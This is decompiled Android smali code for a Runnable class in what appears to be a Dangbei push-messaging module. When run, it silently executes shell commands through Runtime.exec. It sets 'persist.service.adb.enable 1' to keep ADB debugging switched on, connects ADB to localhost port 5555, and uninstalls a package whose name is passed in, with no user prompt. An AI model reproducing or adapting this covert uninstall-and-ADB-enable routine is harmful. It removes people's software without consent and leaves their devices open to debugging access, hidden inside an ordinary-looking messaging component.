.class Lcom/dangbei/msg/push/b/f$3;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/dangbei/msg/push/b/f;->al(Landroid/content/Context;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic alI:Lcom/dangbei/msg/push/b/f;

.field final synthetic alJ:Ljava/lang/String;

.field final synthetic val$context:Landroid/content/Context;


# direct methods
.method constructor <init>(Lcom/dangbei/msg/push/b/f;Landroid/content/Context;Ljava/lang/String;)V
    .locals 0

    .line 437
    iput-object p1, p0, Lcom/dangbei/msg/push/b/f$3;->alI:Lcom/dangbei/msg/push/b/f;

    iput-object p2, p0, Lcom/dangbei/msg/push/b/f$3;->val$context:Landroid/content/Context;

    iput-object p3, p0, Lcom/dangbei/msg/push/b/f$3;->alJ:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    .line 440
    :try_start_0
    iget-object v0, p0, Lcom/dangbei/msg/push/b/f$3;->val$context:Landroid/content/Context;

    iget-object v1, p0, Lcom/dangbei/msg/push/b/f$3;->alJ:Ljava/lang/String;

    invoke-static {v0, v1}, Lcom/dangbei/msg/push/b/b;->getPackageInfo(Landroid/content/Context;Ljava/lang/String;)Landroid/content/pm/PackageInfo;

    move-result-object v0

    .line 441
    if-nez v0, :cond_0

    .line 442
    return-void

    .line 444
    :cond_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v0

    .line 445
    const-string v1, "setprop persist.service.adb.enable 1"

    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 446
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I

    .line 447
    const-string v1, "adb disconnect 127.0.0.1"

    .line 448
    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 449
    invoke-virtual {v1}, Ljava/lang/Process;->waitFor()I

    .line 451
    const-string v1, "adb connect 127.0.0.1"

    .line 452
    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 453
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    .line 455
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "adb -s 127.0.0.1:5555 uninstall "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v1, p0, Lcom/dangbei/msg/push/b/f$3;->alJ:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 456
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v1

    .line 457
    invoke-virtual {v1, v0}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v0

    .line 458
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I

    .line 462
    invoke-virtual {v0}, Ljava/lang/Process;->destroy()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 472
    goto :goto_0

    .line 467
    :catch_0
    move-exception v0

    .line 468
    invoke-static {v0}, Lcom/google/a/a/a/a/a/a;->u(Ljava/lang/Throwable;)V

    .line 473
    :goto_0
    return-void
.end method
